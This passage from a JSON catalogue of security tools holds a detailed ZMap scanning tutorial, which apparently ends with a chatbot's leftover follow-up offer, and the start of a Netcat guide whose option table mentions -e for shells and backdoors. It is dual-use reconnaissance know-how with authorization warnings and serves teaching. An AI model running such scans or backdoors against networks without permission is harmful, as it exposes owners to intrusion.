network traffic:** To understand your device's communications.\n*   **Authorized network troubleshooting and analysis:** On networks where you have explicit permission from the owner or administrator.\n*   **Educational purposes in controlled environments:** Learning about networking protocols and traffic patterns in isolated labs.\n*   **Security testing with proper authorization:** Performing penetration testing or vulnerability assessments on systems you are permitted to examine.\n\n**Unauthorized packet capture and network monitoring may violate privacy laws, data protection regulations (e.g., GDPR, CCPA), and organizational policies, leading to severe legal consequences.** Always obtain proper authorization and ensure you comply with all applicable laws and policies before monitoring any network traffic that is not explicitly your own."
      }
    ]
  },
  {
    "name": "ZMap",
    "description": "An open-source network scanner for internet-wide network surveys.",
    "category": "Network Scanning & Analysis",
    "tags": [
      "network survey",
      "fast scanning"
    ],
    "color": "#e5c34b",
    "articles": [
      {
        "title": "ZMap — Detailed Explanation",
        "content": "# ZMap — Detailed Explanation\n\n> This file provides an expanded, **detailed explanation** of each topic from the ZMap guide, written in clean Markdown so you can save it directly as `ZMap_Detailed_Explanation.md` and use it as documentation or training material.\n\n---\n\n## About this document\n\n* **Audience:** researchers, students, system administrators, and security engineers learning ZMap.\n* **Scope:** In-depth explanations, practical commands, expected outputs, troubleshooting tips, safety and ethics notes.\n* **Safety first:** Always run scans only on networks you own or have written permission to test. Use `--dryrun`, small `-n` limits, and isolated environments for practice.\n\n---\n\n## How this file is organized\n\nEach numbered section contains:\n\n1. **What it is / Why it matters** — short conceptual explanation.\n2. **Step-by-step commands** — runnable commands with safe defaults.\n3. **What to expect** — typical output or behavior.\n4. **Troubleshooting & tips** — common problems and fixes.\n5. **Safety / ethics note** — when applicable.\n\n---\n\n## 1. Install ZMap\n\n### What it is / Why it matters\n\nInstalling ZMap from the package manager gives a quick, stable installation suitable for labs. Building from source provides the latest features, probe modules, and bug fixes — useful for development or custom modules.\n\n### Commands (Ubuntu/Debian)\n\n```bash\n# Quick install from package\nsudo apt update\nsudo apt install -y zmap\nzmap --version\n\n# Build from source for latest features (recommended for module development)\nsudo apt install -y build-essential cmake libgmp3-dev gengetopt libpcap-dev flex byacc libjson-c-dev pkg-config libunistring-dev\ngit clone https://github.com/zmap/zmap.git\ncd zmap\ncmake .\nmake -j$(nproc)\nsudo make install\nzmap --version\n```\n\n### What to expect\n\n* `zmap --version` prints installed ZMap version and confirms binary in `$PATH`.\n\n### Troubleshooting & tips\n\n* If `cmake` fails: check installed dependency versions and the output in `CMakeFiles/CMakeError.log`.\n* If `zmap` is not found after `make install`, check `/usr/local/bin` or run `hash -r`.\n\n### Safety / ethics note\n\n* Building from source is safe; be careful when applying third-party patches — review code before running with elevated privileges.\n\n---\n\n## 2. Create an isolated test environment (network namespace)\n\n### What it is / Why it matters\n\nA Linux network namespace provides a sandboxed network stack. Use it to test scanning commands locally without sending traffic to external networks.\n\n### Step-by-step commands\n\n```bash\nsudo ip netns add zmap-lab\nsudo ip link add veth-host type veth peer name veth-ns\nsudo ip link set veth-ns netns zmap-lab\nsudo ip addr add 10.200.200.1/24 dev veth-host\nsudo ip netns exec zmap-lab ip addr add 10.200.200.2/24 dev veth-ns\nsudo ip link set veth-host up\nsudo ip netns exec zmap-lab ip link set lo up\nsudo ip netns exec zmap-lab ip link set veth-ns up\nsudo ip netns exec zmap-lab ping -c 2 10.200.200.1\n```\n\n### What to expect\n\n* The `ping` should reply. Running `zmap` inside the namespace will only use the virtual pair, preventing real-world scans.\n\n### Troubleshooting & tips\n\n* If `ip` commands fail, install `iproute2` (`sudo apt install iproute2`).\n* Clean up the namespace after testing: `sudo ip netns delete zmap-lab` and remove veth on host.\n\n### Safety / ethics note\n\n* This approach is ideal for learning and avoids accidental scanning of Internet hosts.\n\n---\n\n## 3. Single-port scan (safe whitelist)\n\n### What it is / Why it matters\n\nA focused single-port scan helps discover hosts offering a specific service (e.g., HTTP on port 80) within an authorized set of IPs.\n\n### Commands\n\n```bash\necho \"192.0.2.1\" > targets.txt\necho \"192.0.2.2\" >> targets.txt\nsudo zmap -p 80 -w targets.txt -r 50 -f json -o hits.json\njq -c . hits.json | sed -n '1,3p'\n```\n\n### What to expect\n\n* `hits.json` will contain one JSON object per responding host (line-delimited JSON). Each object includes source/destination addresses, ports, timestamp, and classification.\n\n### Troubleshooting & tips\n\n* No results: target might be offline or filtered. Use `--dryrun` to validate packet generation.\n* If running inside a namespace, ensure `-i` and `-S` match the namespace interface and source IP.\n\n### Safety / ethics note\n\n* Use reserved docs/test IPs (e.g., `192.0.2.0/24`) only for examples. Replace with your authorized lab network for real testing.\n\n---\n\n## 4. Target specification: CIDR / whitelist / blacklist\n\n### What it is / Why it matters\n\nPrecision in target selection prevents accidental scanning of sensitive or unauthorized ranges.\n\n### Commands\n\n```bash\nsudo zmap -p 443 10.0.0.0/24 -r 50 -o out.txt\nsudo zmap -p 22 -w whitelist.txt -r 50 -o ssh_hosts.txt\nsudo zmap -p 80 -w large_targets.txt -b exclude.txt -r 100 -o http_hits.txt\n```\n\n`exclude.txt` sample:\n\n```\n203.0.113.5\n198.51.100.0/28\n```\n\n### What to expect\n\n* ZMap reads the whitelist and excludes addresses in the blacklist. Output only contains results for allowed addresses.\n\n### Troubleshooting & tips\n\n* Ensure file paths are accessible and formatted as one network/CIDR per line.\n* If results are unexpectedly empty, double-check that whitelist entries are correct and not unintentionally filtered.\n\n### Safety / ethics note\n\n* Maintain a robust blacklist containing ISP, government, and sensitive hosting ranges.\n\n---\n\n## 5. Probe modules: TCP, UDP, ICMP, DNS\n\n### What it is / Why it matters\n\nProbe modules determine the protocol and probe behavior. Use the right module for target services (e.g., UDP for DNS).\n\n### Commands\n\n```bash\n# TCP SYN (default)\nsudo zmap -p 80 -w targets.txt -r 50 -o tcp_hits.txt\n\n# UDP (DNS)\nsudo zmap --probe-module=udp -p 53 -w targets.txt -r 50 -o udp_dns_hits.txt\n\n# ICMP echo (ping)\nsudo zmap --probe-module=icmp_echoscan -w targets.txt -r 50 -o icmp_hits.txt\n\n# List probe modules\nzmap --list-probe-modules\n```\n\n#### Module args example (UDP with payload)\n\n```bash\n# create a UDP payload file (binary or text)\necho -n -e \"\\x30\\x26...\" > snmp_payload.bin\nsudo zmap --probe-module=udp -p 161 --probe-args=file:snmp_payload.bin -w targets.txt -r 10 -o snmp_hits.json\n```\n\n### What to expect\n\n* Each module can return different classifications (e.g., `SYN-ACK` for TCP, or `ICMP-TTL` responses). Read module help for module-specific fields.\n\n### Troubleshooting & tips\n\n* Not all distributions ship with every probe module. Building from source may be required for advanced modules.\n\n### Safety / ethics note\n\n* Some probes (especially with payloads) can trigger IDS or cause side effects on services. Test only in lab environments unless explicitly authorized.\n\n---\n\n## 6. Rate control & bandwidth limiting\n\n### What it is / Why it matters\n\nControlling the rate prevents network congestion and reduces the chance of triggering alarms.\n\n### Commands\n\n```bash\n# set packets per second\nsudo zmap -p 80 -w targets.txt -r 100 -o out.txt\n\n# bandwidth limit\nsudo zmap -p 80 -w targets.txt -B 5M -o out_bw.txt\n\n# very small test\nsudo zmap -p 80 -w targets.txt -r 10 -n 10 -o small_test.json\n```\n\n### What to expect\n\n* Lower `-r` leads to fewer sends per second and slower completion time but safer network impact.\n\n### Troubleshooting & tips\n\n* Watch `ip -s link show <iface>` to monitor drops. If drops climb, reduce `-r` or tune NIC buffers.\n\n### Safety / ethics note\n\n* Avoid scanning at high rates on shared infrastructure without coordination.\n\n---\n\n## 7. Output formats: plain / CSV / JSON / Extended\n\n### What it is / Why it matters\n\nChoose output format according to downstream tools (Pipes, ELK, CSV processing, or JSON-based tooling).\n\n### Commands\n\n```bash\n# plain (IP list)\nsudo zmap -p 80 -w targets.txt -o ips.txt\n\n# CSV\nsudo zmap -p 80 -w targets.txt -f csv -o results.csv\n\n# JSON (line-delimited)\nsudo zmap -p 80 -w targets.txt -f json -o results.json\n\n# extended CSV with chosen fields\nsudo zmap -p 80 -f csv -O extended --output-fields=saddr,daddr,sport,dport,timestamp -w targets.txt -o extended.csv\n```\n\n### What to expect\n\n* JSON is easiest for structured pipelines. CSV is compact and convenient for spreadsheets.\n\n### Troubleshooting & tips\n\n* Use `jq` for JSON parsing in shell pipelines. Example: `jq -r '.daddr' results.json`.\n\n---\n\n## 8. Save & limit results: `-o`, `-n`, `--output-fields`\n\n### What it is / Why it matters\n\nLimit result size during development to avoid huge files.\n\n### Commands\n\n```bash\nsudo zmap -p 443 -w targets.txt -n 50 -o top50.txt\nsudo zmap -p 80 -f csv --output-fields=saddr,daddr,dport -w targets.txt -o chosen.csv\n```\n\n### What to expect\n\n* `-n` stops after `n` results; `-o` redirects output to a file.\n\n### Troubleshooting & tips\n\n* Use `-n` for initial tests and remove when you have approvals for larger runs.\n\n---\n\n## 9. Network interface & source IP selection\n\n### What it is / Why it matters\n\nSelecting an interface or source IP controls routing and helps in multi-homed environments.\n\n### Commands\n\n```bash\nsudo zmap -p 80 -i eth0 -w targets.txt -o if_out.txt\nsudo zmap -p 80 -S 192.168.1.100 -w targets.txt -o srcip_out.txt\nsudo ip netns exec zmap-lab zmap -p 80 -i veth-ns -S 10.200.200.2 -w targets.txt -o ns_out.json\n```\n\n### Troubleshooting & tips\n\n* \"Could not bind\" errors mean the selected source IP is not configured on the system. Use `ip addr show` to verify.\n\n---\n\n## 10. Packet customization: TTL, TCP window, payload\n\n### What it is / Why it matters\n\nCustomize low-level fields to match testing goals or to fingerprint behaviors.\n\n### Commands\n\n```bash\nsudo zmap -p 80 --ttl=64 -w targets.txt -o ttl_hits.txt\nsudo zmap --probe-module=tcp_synscan --probe-args=window:65535 -p 80 -w targets.txt -o tcp_win.txt\necho -n \"probe-payload\" > payload.bin\nsudo zmap -p 12345 --payload-file=payload.bin -w targets.txt -o payload_hits.txt\n```\n\n### Troubleshooting & tips\n\n* Some devices or middleboxes may respond differently to unusual TTL or payloads; test in lab first.\n\n---\n\n## 11. ZMap → ZGrab pipeline (banner grabbing)\n\n### What it is / Why it matters\n\nZMap quickly discovers hosts; ZGrab fetches application-level banners (HTTP titles, TLS certs) from those hosts.\n\n### Commands\n\n```bash\nsudo zmap -p 80 -w targets.txt -f csv --output-fields=daddr -o hosts.csv\nawk -F',' '{print $1}' hosts.csv > iplist.txt\ncat iplist.txt | zgrab --port 80 --http=\"/\" --output-file=banners.json\njq -c '.[] | {ip:.ip, status:.data.http.status_code, title:.data.http.title}' banners.json | sed -n '1,5p'\n```\n\n### What to expect\n\n* `banners.json` contains structured responses, including headers, status codes, and optional HTML titles.\n\n### Troubleshooting & tips\n\n* ZGrab may need TLS flags for HTTPS. Use `--tls` or zgrab2 for more modern TLS options.\n\n---\n\n## 12. Real-time streaming & pipe processing\n\n### What it is / Why it matters\n\nProcessing results as they arrive enables faster analysis, immediate follow-up actions, and streaming into other systems.\n\n### Example command\n\n```bash\nsudo zmap -p 80 -w targets.txt -f csv -r 50 | \\\nwhile IFS=, read -r ip; do\n  echo \"Found: $ip\"\n  echo \"$ip\" | zgrab --port 80 --http=\"/\" --output-file=- 2>/dev/null | jq .\ndone\n```\n\n### Troubleshooting & tips\n\n* Keep per-hit processing light. Heavy processing (e.g., database writes) should be offloaded to worker queues to avoid blocking the pipeline.\n\n---\n\n## 13. Performance tuning: `ulimit` & kernel buffers\n\n### What it is / Why it matters\n\nHigh-rate scanning demands more file descriptors and larger kernel socket buffers.\n\n### Commands\n\n```bash\n# increase open file descriptors\nulimit -n 65535\n\n# system tuning\necho 'net.core.rmem_max = 134217728' | sudo tee -a /etc/sysctl.conf\necho 'net.core.wmem_max = 134217728' | sudo tee -a /etc/sysctl.conf\nsudo sysctl -p\n\n# monitor NIC stats\nwatch -n 1 'ip -s link show eth0'\n```\n\n### Troubleshooting & tips\n\n* Tune gradually and observe NIC drops and CPU usage. For very large scans consider moving to 10GbE NICs and multiple machines.\n\n---\n\n## 14. Monitoring & statistics during a run\n\n### Commands\n\n```bash\nsudo zmap -p 80 -w targets.txt -r 100 --monitor-file=monitor.csv --progress-updates -o out.json\ntail -f monitor.csv\nwatch -n 1 'ss -s'\n```\n\n### What to expect\n\n* `monitor.csv` provides counters and timing information that can be used to compute hit rates and identify problems.\n\n---\n\n## 15. Automate scans: systemd service & timer\n\n### Service unit example `/etc/systemd/system/zmap-test.service`\n\n```ini\n[Unit]\nDescription=ZMap daily test\nAfter=network-online.target\nWants=network-online.target\n\n[Service]\nType=oneshot\nExecStart=/usr/bin/ip netns exec zmap-lab /usr/bin/zmap -i veth-ns -S 10.200.200.2 -p 80 -w /home/you/targets.txt -r 50 -n 50 -f json -o /var/log/zmap/http_hits.json\n\n[Install]\nWantedBy=multi-user.target\n```\n\n### Timer example `/etc/systemd/system/zmap-test.timer`\n\n```ini\n[Unit]\nDescription=Run zmap-test daily\n\n[Timer]\nOnCalendar=*-*-* 03:00:00\nPersistent=true\n\n[Install]\nWantedBy=timers.target\n```\n\n### Commands\n\n```bash\nsudo systemctl daemon-reload\nsudo systemctl enable --now zmap-test.timer\nsudo systemctl start zmap-test.service\nsudo journalctl -u zmap-test.service -n 200\n```\n\n### Tips\n\n* Keep scheduled jobs conservative. Capture output for audit.\n\n---\n\n## 16. Parse & store results (SQLite example)\n\n### What it is / Why it matters\n\nStoring results in a local database simplifies queries, joins with enrichment data, and simple reporting.\n\n### Importer script (save as `import_zmap_sqlite.py`)\n\n```python\n#!/usr/bin/env python3\nimport sqlite3, json\nDB='zmap_results.db'\nZMAP='hits.json'   # line-delimited JSON from zmap\nconn = sqlite3.connect(DB)\nc = conn.cursor()\nc.execute('CREATE TABLE IF NOT EXISTS hits (daddr TEXT PRIMARY KEY, saddr TEXT, dport INTEGER, ts TEXT)')\nconn.commit()\nwith open(ZMAP) as f:\n    for line in f:\n        obj = json.loads(line)\n        c.execute('INSERT OR REPLACE INTO hits (daddr,saddr,dport,ts) VALUES (?,?,?,?)',\n                  (obj.get('daddr'), obj.get('saddr'), obj.get('dport'), obj.get('timestamp')))\nconn.commit()\nconn.close()\nprint('Imported into', DB)\n```\n\n### Run & query\n\n```bash\npython3 import_zmap_sqlite.py\nsqlite3 zmap_results.db \"SELECT daddr, ts FROM hits ORDER BY ts DESC LIMIT 10;\"\n```\n\n---\n\n## 17. Ethics, legal, and safe practices\n\n### Checklist\n\n* Obtain explicit written authorization before scanning third-party networks.\n* Start with `--dryrun` and small test sets (`-n 10`, `-r 10`).\n* Maintain logs of approvals, scan time, scope, and parameters.\n* Use blacklists to exclude sensitive ranges.\n* Notify upstream providers for high-rate scans.\n\n### Safety commands\n\n```bash\nsudo zmap -p 80 --dryrun -w targets.txt\nsudo zmap -p 80 -w targets.txt -n 10 -r 10 -o tiny_test.json\n```\n\n---\n\n## 18. IPv6 scanning considerations\n\n### What it is / Why it matters\n\nIPv6 cannot be brute-forced like IPv4 due to the large address space. Research uses targeted lists, DNS enumeration, and heuristics.\n\n### Targeted example (if your ZMap supports IPv6)\n\n```bash\n# ipv6_targets.txt example\n2001:db8::1\n2001:db8::2\n\n# run (if -6 supported by build)\nsudo zmap -6 -p 80 -w ipv6_targets.txt -r 10 -o ipv6_hits.json\n```\n\n---\n\n## 19. Distributed / multi-host scanning orchestration\n\n### What it is / Why it matters\n\nSplitting scan load reduces duration and per-host impact while allowing parallelism.\n\n### Simple orchestration pattern\n\n```bash\n# partition large_targets.txt into 4 parts\nsplit -n l/4 large_targets.txt targets_part_\n\n# run on remote hosts (scan_hosts.txt contains remote node hostnames)\ncat scan_hosts.txt | parallel -j 4 ssh {} \"sudo zmap -p 80 -w ~/targets_part_{}.txt -r 500 -o ~/zmap_out_{}.json\"\n```\n\n### Tips\n\n* Ensure non-overlapping partitioning. Use secure keys and coordinate with network teams.\n\n---\n\n## 20. Result visualization (maps, dashboards)\n\n### What it is / Why it matters\n\nVisualization helps spot geographic or ASN concentration and trends.\n\n### Quick GeoIP CSV example\n\n```bash\nawk -F',' '{print $1}' results.csv | sort -u > ips.txt\nwhile read ip; do\n  country=$(geoiplookup $ip | awk -F: '{print $2}' | cut -d',' -f1)\n  echo \"$ip,$country\"\ndone < ips.txt > ips_countries.csv\n```\n\n### Better approach\n\nUse MaxMind mmdb locally or import to Elastic/Grafana for interactive dashboards.\n\n---\n\n## 21. IDS/IPS detection & responsible tuning\n\n### What it is / Why it matters\n\nScans trigger IDS/IPS; responsible tuning reduces false positives during research.\n\n### Responsible tuning example\n\n```bash\nsudo zmap -p 80 -r 10 --source-port=40000-45000 -w targets.txt -o lowrate.json\n```\n\n### Ethics reminder\n\nDo not attempt to evade detection in networks you do not own.\n\n---\n\n## 22. Writing or customizing probe modules\n\n### What it is / Why it matters\n\nCustom modules allow targeted application-level probes with special payloads and parsing.\n\n### Development workflow (overview)\n\n1. Clone the zmap repo.\n2. Inspect `src/modules/probe_modules/` for examples.\n3. Create new module (C), register, and rebuild.\n\n```bash\ngit clone https://github.com/zmap/zmap.git\ncd zmap\n# add module source under src/modules/probe_modules\ncmake .\nmake -j$(nproc)\nsudo make install\n```\n\n### Tips\n\n* Write unit tests and test in isolated namespaces. Follow C project best practices.\n\n---\n\n## 23. Debugging & verbose logging\n\n### Commands\n\n```bash\n# simulate without sending\nsudo zmap -p 80 --dryrun -w targets.txt\n\n# status updates and logs\nsudo zmap -p 80 -w targets.txt --status-updates-file=status.log --progress-updates -r 50\ntail -f status.log\n\ndmesg | tail -n 50\n```\n\n### Troubleshooting\n\n* Permission errors: add `sudo` or `setcap cap_net_raw+ep /usr/local/bin/zmap`.\n* NIC drops: reduce `-r` and monitor `ip -s link`.\n\n---\n\n## 24. Contributing & building from source (dev workflow)\n\n### Commands\n\n```bash\ngit clone https://github.com/zmap/zmap.git\ncd zmap\nsudo apt install -y build-essential cmake libgmp3-dev gengetopt libpcap-dev flex byacc libjson-c-dev pkg-config libunistring-dev\ncmake .\nmake -j$(nproc)\n# run tests if project provides any\nctest --output-on-failure || true\n```\n\n### Tips\n\n* Follow repository contribution guidelines and open PRs with clear descriptions and tests.\n\n---\n\n## 25. Logging, retention & privacy-safe storage\n\n### logrotate example `/etc/logrotate.d/zmap`\n\n```\n/var/log/zmap/*.json {\n    daily\n    rotate 14\n    compress\n    missingok\n    notifempty\n    create 0640 root root\n}\n```\n\n### Hash IPs to protect privacy\n\n```bash\njq -r '.daddr' hits.json | while read ip; do echo -n \"$ip\" | sha256sum | awk '{print $1}'; done > hits_hashed.txt\n```\n\n### Policy\n\nStore raw IPs only with strict access controls and legal approval.\n\n---\n\n## 26. SIEM / ELK integration (indexing ZMap results)\n\n### Quick steps\n\n1. Write ZMap JSON to `/var/log/zmap/hits.json`.\n2. Configure Filebeat or Fluentd with JSON parsing to forward to Logstash/Elastic.\n\n### Simple test\n\n```bash\nsudo zmap -p 80 -w targets.txt -f json -o /var/log/zmap/hits.json\ntail -F /var/log/zmap/hits.json | while read line; do echo \"$line\" | jq .; done\n```\n\n---\n\n## 27. Research publication & responsible disclosure workflow\n\n### Metadata for reproducibility\n\n```bash\ncat > scan_metadata.json <<'JSON'\n{\n  \"date\": \"2025-10-15T11:00:00Z\",\n  \"tool\": \"zmap\",\n  \"version\": \"$(zmap --version 2>&1 | tr -d '\\n')\",\n  \"targets\": \"192.0.2.0/28 (test)\",\n  \"rate\": 50,\n  \"approvals\": \"approve_record_id_12345\"\n}\nJSON\n\ncp hits.json hits_20251015.json\ncp scan_metadata.json hits_20251015.metadata.json\n```\n\n### Responsible disclosure checklist\n\n* Verify legal and IRB obligations.\n* Notify affected parties when appropriate.\n* Release aggregated/anonymized findings.\n* Make raw data available under restricted access only.\n\n---\n\n## Appendix — Useful snippets & templates\n\n### Safe `targets.txt` example\n\n```\n10.0.0.10\n10.0.0.11\n```\n\n### Quick importer (SQLite) - `import_zmap_sqlite.py`\n\n```python\n#!/usr/bin/env python3\nimport sqlite3, json\nDB='zmap_results.db'\nZMAP='hits.json'\nconn = sqlite3.connect(DB)\nc = conn.cursor()\nc.execute('CREATE TABLE IF NOT EXISTS hits (daddr TEXT PRIMARY KEY, saddr TEXT, dport INTEGER, ts TEXT)')\nwith open(ZMAP) as f:\n    for line in f:\n        obj = json.loads(line)\n        c.execute('INSERT OR REPLACE INTO hits (daddr,saddr,dport,ts) VALUES (?,?,?,?)',\n                  (obj.get('daddr'), obj.get('saddr'), obj.get('dport'), obj.get('timestamp')))\nconn.commit()\nconn.close()\nprint('Imported into', DB)\n```\n\n---\n\n## Next steps I can take for you\n\n* Export this as a downloadable `.md` file and place it in the canvas.\n* Add runnable helper files (`targets.txt`, `import_zmap_sqlite.py`, `zmap-test.service`, `zmap-test.timer`, synthetic `hits.json`/`banners.json`).\n* Produce a printable PDF.\n\nWhich of these would you like me to do now?\n"
      }
    ]
  },
  {
    "name": "Netcat",
    "description": "The \"Swiss-army knife\" for TCP/IP networking.",
    "category": "Network Scanning & Analysis",
    "tags": [
      "port listening",
      "data transfer",
      "backdoor"
    ],
    "color": "#4b75e5",
    "articles": [
      {
        "title": "Netcat: The Network Swiss Army Knife",
        "content": "# Netcat: The Network Swiss Army Knife\n\n## Understanding Netcat\n\n### What it is / Why it matters\n\nNetcat (often abbreviated `nc`) is an incredibly versatile command-line utility for reading from and writing to network connections using TCP or UDP protocols. Dubbed the \"Swiss Army knife\" of networking tools, it can function as a simple TCP/UDP client or server, a port scanner, a tool for file transfer, and even a basic backdoor or network relay. Its simplicity and power make it an indispensable tool for network administrators, developers, and security professionals for troubleshooting, testing, and security assessments.\n\n## Installation & Setup\n\nBefore you can leverage Netcat's capabilities, you need to install it on your operating system. Different Netcat implementations exist, with `netcat-openbsd` generally being recommended on Linux for its feature set and reliable behavior.\n\n### Linux Installation\n\n#### What it is / Why it matters\nNetcat is not always pre-installed on Linux distributions. Installing it allows you to utilize its networking functionalities. The `netcat-openbsd` package is often preferred for its robust features and predictable behavior compared to older `gnu-netcat` or traditional versions.\n\n#### Step-by-step commands\n\n**For Ubuntu/Debian-based systems (traditional Netcat):**\n```bash\nsudo apt update\nsudo apt install netcat\n```\n\n**For Ubuntu/Debian-based systems (OpenBSD Netcat - recommended):**\n```bash\nsudo apt update\nsudo apt install netcat-openbsd\n```\n\n**For CentOS/RHEL-based systems:**\n```bash\nsudo yum install nc\n```\n*(Note: On newer RHEL/CentOS versions, `dnf` replaces `yum`)*\n```bash\nsudo dnf install nc\n```\n\n**For Arch Linux:**\n```bash\nsudo pacman -S gnu-netcat\n```\n*(Note: Arch often uses `gnu-netcat` which might have slightly different syntax than OpenBSD Netcat, e.g., for listening on a port.)*\n\n#### What to expect\nAfter running the installation command, you should see progress indicators as packages are downloaded and installed. Upon successful installation, you can verify it by running `nc -h` or `netcat -h`.\n\n#### Troubleshooting & tips\n*   **\"command not found\" error:** Ensure your package manager completed the installation without errors. If using `nc`, try `netcat` as some systems symlink `nc` to `netcat`.\n*   **Package not found:** Double-check the package name for your specific distribution. Sometimes it might be `netcat-traditional` or just `netcat`.\n*   **Permission issues:** `sudo` is required for `apt`, `yum`, `dnf`, and `pacman` to install system-wide packages.\n\n### macOS Installation\n\n#### What it is / Why it matters\nNetcat is typically pre-installed on macOS, providing basic networking capabilities out of the box. However, installing it via Homebrew ensures you have the latest version, which might include updated features or bug fixes.\n\n#### Step-by-step commands\n\n**Check if pre-installed:**\n```bash\nnc -h\n```\n\n**Install or update via Homebrew (recommended for latest version):**\n```bash\nbrew install netcat\n```\n\n#### What to expect\nIf pre-installed, `nc -h` will display the help output for the default Netcat version. If installing via Homebrew, you'll see Homebrew's installation progress and a confirmation that Netcat was successfully installed or updated.\n\n#### Troubleshooting & tips\n*   **`brew command not found`:** You need to install Homebrew first. Visit [brew.sh](https://brew.sh) for instructions.\n*   **Different behavior:** The pre-installed `nc` on macOS is usually the OpenBSD version. If you install via Homebrew, it might be `gnu-netcat`, which could have subtle command-line option differences. If you encounter issues, try specifying the full path to the Homebrew version (e.g., `/opt/homebrew/bin/nc` on Apple Silicon or `/usr/local/bin/nc` on Intel).\n\n### Windows Installation\n\n#### What it is / Why it matters\nNetcat is not natively available on Windows. To use it, you generally download a pre-compiled binary or use the Windows Subsystem for Linux (WSL). Nmap's `Ncat` is a modern, feature-rich alternative that is often recommended for Windows users.\n\n#### Step-by-step commands\n\n**Option 1: Download Ncat (Nmap's Netcat implementation)**\n1.  Visit the official Ncat download page: [https://nmap.org/ncat/](https://nmap.org/ncat/)\n2.  Download the appropriate installer for your Windows architecture (e.g., `nmap-*-win32.zip` or the full Nmap installer which includes Ncat).\n3.  Extract `ncat.exe` (if downloading the zip) or follow the Nmap installation wizard.\n4.  Optionally, add the directory containing `ncat.exe` to your system's PATH environment variable for easy access from any command prompt.\n\n**Option 2: Use Windows Subsystem for Linux (WSL)**\n1.  Ensure WSL is installed and set up on your system. If not, refer to Microsoft's official documentation for installation: [https://learn.microsoft.com/en-us/windows/wsl/install](https://learn.microsoft.com/en-us/windows/wsl/install)\n2.  Open your WSL terminal (e.g., Ubuntu).\n3.  Install Netcat within WSL using the Linux commands:\n    ```bash\n    wsl sudo apt update\n    wsl sudo apt install netcat-openbsd\n    ```\n\n#### What to expect\n*   **Ncat download:** You'll have an `ncat.exe` executable. Running `ncat -h` from a command prompt (if in PATH or in the directory) will show its help message.\n*   **WSL installation:** Within your WSL terminal, `nc -h` should display the help for the OpenBSD Netcat version.\n\n#### Troubleshooting & tips\n*   **Ncat path:** If `ncat` doesn't work directly, navigate to the directory where `ncat.exe` is located in your command prompt, or add its path to your system's `PATH` variable.\n*   **WSL setup:** If WSL commands fail, ensure WSL is properly installed and your chosen Linux distribution is running.\n*   **Firewall:** Windows Defender or third-party firewalls might block Netcat/Ncat connections. Ensure you create appropriate firewall rules if you intend to use Netcat for listening or specific network interactions.\n\n## Basic Usage & Syntax\n\nUnderstanding Netcat's fundamental command structure and common options is crucial for effective use.\n\n### What it is / Why it matters\nNetcat's strength lies in its simplicity. It follows a predictable command structure that allows users to quickly establish connections, listen for incoming data, or perform various network diagnostics with minimal effort. Knowing the core syntax and options enables you to tailor Netcat's behavior for specific tasks, from basic communication to sophisticated port scanning.\n\n### Step-by-step commands\n\n#### Command Structure\nThe basic syntax typically involves specifying options, a target hostname or IP address, and a port number.\n\n```bash\n# Basic syntax:\nnc [options] [hostname] [port]\n\n# Example: Connect to a host on a specific port (TCP is default)\nnc example.com 80\n\n# Example: Listen for incoming connections on a specific port\nnc -l -p 1234\n# (Note: On OpenBSD Netcat, '-l' often implies listening, and '-p' might not be strictly needed,\n#  the port can be the last argument: `nc -l 1234`)\n\n# Example: Use UDP mode instead of TCP\nnc -u example.com 53\n```\n\n#### Common Options\nNetcat offers a rich set of options to control its behavior. Here are some of the most frequently used ones:\n\n| Option        | Description                                                                 |\n| :------------ | :-------------------------------------------------------------------------- |\n| `-l`          | **Listen mode:** Listen for incoming connections (server mode).             |\n| `-p <port>`   | **Port specification:** Specify the source port number (less common for client, but useful for server). |\n| `<port>`      | **Target Port:** The port number to connect to or listen on (often used as the last argument in OpenBSD `nc`). |\n| `-u`          | **UDP mode:** Use UDP instead of the default TCP protocol.                  |\n| `-4`          | **Force IPv4:** Use IPv4 addresses only.                                    |\n| `-6`          | **Force IPv6:** Use IPv6 addresses only.                                    |\n| `-w <timeout>`| **Connection timeout:** Set a timeout in seconds for connections.           |\n| `-i <interval>`| **Delay interval:** Delay interval between lines sent from standard input (useful for slow transfers).|\n| `-v`          | **Verbose output:** Display more detailed information about connections and errors (highly recommended).|\n| `-n`          | **Don't resolve hostnames:** Use numeric IP addresses only (speeds up scanning, avoids DNS lookups).|\n| `-z`          | **Zero-I/O mode:** Scan for open ports without sending any data (useful for port scanning).|\n| `-e <program>`| **Execute program:** Execute a program after connection (used for shells/backdoors - **use with extreme caution**).|\n\n### What to expect\nWhen using `nc -h` or `netcat -h`, you should see a comprehensive list of available options and their descriptions, confirming the version and capabilities of your Netcat installation. When running commands, you'll observe different behaviors based on the chosen options, such as verbose output (`-v`) showing connection attempts and status.\n\n### Troubleshooting & tips\n*   **Version differences:** Pay close attention to your Netcat version. Options like `-p` for specifying the listening port are required in some versions (like GNU Netcat) but can be omitted or are used differently (e.g., for source port) in OpenBSD Netcat, where the listening port is just the final argument.\n*   **Firewall:** If connections fail, check local and network firewalls that might be blocking the specified ports.\n*   **Verbose mode (`-v`):** Always use verbose mode when troubleshooting. It provides crucial feedback on connection status, errors, and progress.\n*   **Numeric IPs (`-n`):** For faster and more reliable scanning, especially in scripts, use `-n` to avoid DNS resolution issues.\n\n## Client-Server Communication\n\nNetcat's most fundamental use case is establishing direct client-server communication, allowing for simple text exchanges or testing network services.\n\n### Simple Chat Server\n\n#### What it is / Why it matters\nThis demonstrates Netcat's ability to create a basic, unfiltered communication channel between two machines. It acts as a rudimentary chat application, perfect for understanding how Netcat listens for and handles connections.\n\n#### Step-by-step commands\n\n**1. Set up the server (listen on port 1234):**\nOn one machine (the server), open a terminal and run:\n```bash\nnc -l -p 1234\n# Or, if using OpenBSD Netcat:\n# nc -l 1234\n```\n\n**2. Connect the client to the server:**\nOn another machine (the client), open a terminal and run (replace `localhost` with the server's IP address if on different machines):\n```bash\nnc localhost 1234\n```\n\n**3. Start communicating:**\nAfter the client connects, you can type messages in either terminal and press Enter; the message will appear in the other terminal.\n\n#### What to expect\n*   **Server:** Once `nc -l -p 1234` is run, the server terminal will appear to hang, waiting for a connection. Once a client connects, any text typed on the client side will appear in the server's terminal, and vice-versa.\n*   **Client:** After `nc localhost 1234` is run, the client terminal will also appear to hang, indicating a successful connection. You can immediately start typing.\n*   **Connection close:** Press `Ctrl+C` in either terminal to close the connection. The other side will see the connection drop.\n\n#### Troubleshooting & tips\n*   **\"Connection refused\" / \"No route to host\":**\n    *   Ensure the server command is running *before* the client attempts to connect.\n    *   Verify the server's IP address is correct if not using `localhost`.\n    *   Check firewall rules on the server that might be blocking port 1234.\n*   **No output:** Ensure you press `Enter` after typing your message 